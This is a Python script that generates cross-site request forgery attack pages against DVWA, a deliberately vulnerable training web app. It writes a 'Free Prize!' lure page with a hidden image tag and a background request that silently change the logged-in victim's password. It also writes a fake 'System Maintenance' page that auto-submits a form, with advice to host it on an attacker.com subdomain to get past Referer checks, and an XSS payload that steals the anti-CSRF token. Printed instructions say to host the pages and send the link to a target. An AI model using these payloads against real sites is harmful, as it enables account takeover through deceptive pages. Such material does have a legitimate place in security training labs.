#!/usr/bin/env python3
"""
DVWA CSRF Attack Page Generator
Generates malicious HTML page for CSRF attack against DVWA
Usage: python3 generate_csrf.py <DVWA_IP> <NEW_PASSWORD> [ATTACKER_IP]
"""
import sys, os

DVWA_IP    = sys.argv[1] if len(sys.argv) > 1 else "192.168.56.104"
NEW_PASS   = sys.argv[2] if len(sys.argv) > 2 else "hacked123"
ATTACK_IP  = sys.argv[3] if len(sys.argv) > 3 else "192.168.56.102"

# Low Security CSRF (GET-based, no token)
html_low = f"""<!DOCTYPE html>
<html>
<head><title>Free Prize!</title></head>
<body>
<h1>Congratulations! You won a prize!</h1>
<p>Please wait while we process your reward...</p>

<!-- CSRF Attack — password silently changed via GET request -->
<img src="http://{DVWA_IP}/dvwa/vulnerabilities/csrf/?password_new={NEW_PASS}&password_conf={NEW_PASS}&Change=Change" style="display:none" width="0" height="0">

<script>
// Also try via JavaScript redirect
setTimeout(function(){{
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'http://{DVWA_IP}/dvwa/vulnerabilities/csrf/?password_new={NEW_PASS}&password_conf={NEW_PASS}&Change=Change', true);
  xhr.withCredentials = true;
  xhr.send();
}}, 1000);
</script>

<p>Loading your prize... <span id="count">5</span></p>
<script>
var c=5; var t=setInterval(function(){{
  document.getElementById('count').textContent=--c;
  if(c<=0){{clearInterval(t);document.body.innerHTML='<h1>Error: Prize expired</h1>';}}
}},1000);
</script>
</body>
</html>"""

# Medium Security CSRF (needs Referer bypass)
html_medium = f"""<!DOCTYPE html>
<!-- Host this at a subdomain containing the target server name -->
<!-- e.g., http://{DVWA_IP}.attacker.com/csrf_medium.html -->
<html>
<head><title>Security Update Required</title></head>
<body>
<h1>System Maintenance</h1>
<form id="csrf_form" action="http://{DVWA_IP}/dvwa/vulnerabilities/csrf/" method="GET">
  <input type="hidden" name="password_new" value="{NEW_PASS}">
  <input type="hidden" name="password_conf" value="{NEW_PASS}">
  <input type="hidden" name="Change" value="Change">
</form>
<script>document.getElementById('csrf_form').submit();</script>
</body>
</html>"""

# High Security — XSS-assisted CSRF
xss_payload = f"""<script>
fetch('/dvwa/vulnerabilities/csrf/',{{credentials:'include'}})
.then(r=>r.text())
.then(h=>{{
  var t=h.match(/user_token[^>]*value=['"]([a-f0-9]+)['"]/);
  if(t){{
    var url='/dvwa/vulnerabilities/csrf/?password_new={NEW_PASS}&password_conf={NEW_PASS}&Change=Change&user_token='+t[1];
    fetch(url,{{credentials:'include'}}).then(()=>console.log('CSRF done'));
  }}
}});
</script>"""

# Save files
with open("csrf_low.html", "w") as f:
    f.write(html_low)

with open("csrf_medium.html", "w") as f:
    f.write(html_medium)

with open("csrf_high_xss_payload.txt", "w") as f:
    f.write(xss_payload)

print("[+] Generated files:")
print(f"    csrf_low.html        — For DVWA Low Security (GET-based, no token)")
print(f"    csrf_medium.html     — For DVWA Medium (Referer bypass)")
print(f"    csrf_high_xss_payload.txt — Inject via Stored XSS for High security")
print(f"\n[*] Host the HTML files:")
print(f"    python3 -m http.server 8080")
print(f"\n[*] Send the link to target:")
print(f"    http://{ATTACK_IP}:8080/csrf_low.html")
print(f"\n[*] New password after CSRF: {NEW_PASS}")
